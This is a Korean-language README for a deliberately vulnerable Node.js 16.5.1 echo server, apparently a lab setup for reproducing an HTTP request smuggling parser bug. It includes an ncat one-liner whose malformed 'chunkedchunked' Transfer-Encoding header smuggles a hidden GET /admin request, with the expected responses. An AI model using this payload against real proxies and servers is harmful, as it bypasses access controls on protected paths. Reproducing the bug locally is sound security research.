# Backend (Node.js 서버) README

요구사항:

- Node.js 16.5.1 (이보다 높은 버전은 파서 버그가 패치되어서 스머글링 불가능)

테스트 서버 실행:

``` console
node app.js
```

밑의 코드는 개발중인 코드고 실제로 동작하는 서버 코드는 이부분입니다:

``` javascript
  let body = [];
  req.on('error', (err) => {
    res.end("error while reading body: " + err)
  }).on('data', (chunk) => {
    body.push(chunk);
  }).on('end', () => {
    body = Buffer.concat(body).toString();
    res.on('error', (err) => {
      res.end("error while sending response: " + err)
    });
   res.end(JSON.stringify({
      "URL": req.url,
      "Headers": req.headers,
      "Length": body.length,
      "Body": body,
    }) + "\n");
  });
```

그냥 요청 URL, Header, Length, Body를 그대로 되돌려주기만 합니다.

로컬에서 실행했을 때에는, Windows Powershell과 [NMap](https://nmap.org/ncat/)의 ncat을 사용해서 [파싱 버그를 재현](https://hackerone.com/reports/1524555)했었습니다.

``` console
echo "GET / HTTP/1.1`r`nTransfer-Encoding: chunkedchunked`r`n`r`n26`r`nGET / HTTP/1.1`r`nContent-Length: 30`r`n`r`n`r`n0`r`n`r`n`r`nGET /admin HTTP/1.1`r`n" | ncat localhost 8080
```

이렇게 요청했을 때 응답이 이래야 합니다:

응답 1번째:

```
HTTP/1.1 200 OK
Date: Wed, 01 Nov 2023 06:58:11 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 127

{"URL":"/","Headers":{"transfer-encoding":"chunkedchunked"},"Length":38,"Body":"GET / HTTP/1.1\r\nContent-Length: 30\r\n\r\n"}
```

응답 2번째:

```
HTTP/1.1 200 OK
Date: Wed, 01 Nov 2023 06:58:11 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 56

{"URL":"/admin","Headers":{},"Length":0,"Body":""}
```

중요한 건 ATS가 첫 번째 요청을 무시하면서 그걸 노드에 그대로 전달해주는지 마는지네요.
